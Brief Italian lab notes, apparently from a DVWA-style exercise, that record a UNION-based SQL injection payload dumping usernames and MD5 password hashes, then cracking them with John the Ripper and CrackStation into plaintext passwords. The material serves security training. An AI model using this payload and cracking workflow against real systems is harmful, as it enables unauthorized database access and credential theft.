appunti:

1. SQL injections per trovare le password
Query: 1' UNION SELECT NULL, CONCAT(user, ':', password) FROM users #

    user + password: admin:5f4dcc3b5aa765d61d8327deb882cf99
    user + password: gordonb:e99a18c428cb38d5f260853678922e03
    user + password: 1337:8d3533d75ae2c3966d7e0d4fcc69216b
    user + password: pablo:0d107d09f5bbe40cade3de5c71e9e9b7
    user + password: smithy:5f4dcc3b5aa765d61d8327deb882cf99

2. creato file txt dove metto le password da analizzare:

5f4dcc3b5aa765d61d8327deb882cf99 x2
e99a18c428cb38d5f260853678922e03
8d3533d75ae2c3966d7e0d4fcc69216b
0d107d09f5bbe40cade3de5c71e9e9b7


3. utilizzato john e CrackStation per provare a decodificare le password

5f4dcc3b5aa765d61d8327deb882cf99 -> password x2
e99a18c428cb38d5f260853678922e03 -> abc123
8d3533d75ae2c3966d7e0d4fcc69216b -> letmein
0d107d09f5bbe40cade3de5c71e9e9b7 -> charley
